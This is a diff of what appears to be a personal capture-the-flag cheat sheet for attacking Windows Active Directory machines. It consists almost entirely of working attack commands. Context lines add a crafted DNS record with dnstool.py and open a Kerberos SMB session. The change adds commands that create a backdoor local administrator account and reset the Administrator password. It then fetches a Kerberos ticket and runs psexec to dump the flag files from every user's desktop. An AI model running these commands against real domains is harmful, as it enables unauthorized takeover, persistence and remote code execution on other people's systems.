@@ -163,8 +163,14 @@ dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP 
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
 impacket-smbclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
 
-## ROOT FLAG
-impacket-getTGT -dc-ip $TARGET $DOM/'administrator':'$PASSWORD'; export KRB5CCNAME=`pwd`/administrator.ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -v '\['
+## Create an Administrator Account
+net user myadmin 123qweasdF! /add && net localgroup Administrators myadmin /add
+
+## Change Administrator Password
+net user administrator 123qweasdF!
+
+## GG - ROOT FLAG
+U=administrator;impacket-getTGT -dc-ip $TARGET $DOM/"$U":'123qweasdF!'; export KRB5CCNAME=`pwd`/"$U".ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -vE '\[|-' | xargs -n1 | xargs -I{} gg {}
 
 ## Start Bloodhound
 Set-Location "$env:USERPROFILE\Downloads"; docker compose down; docker volume rm @(docker volume ls -q | Select-String neo4j-data); docker compose up
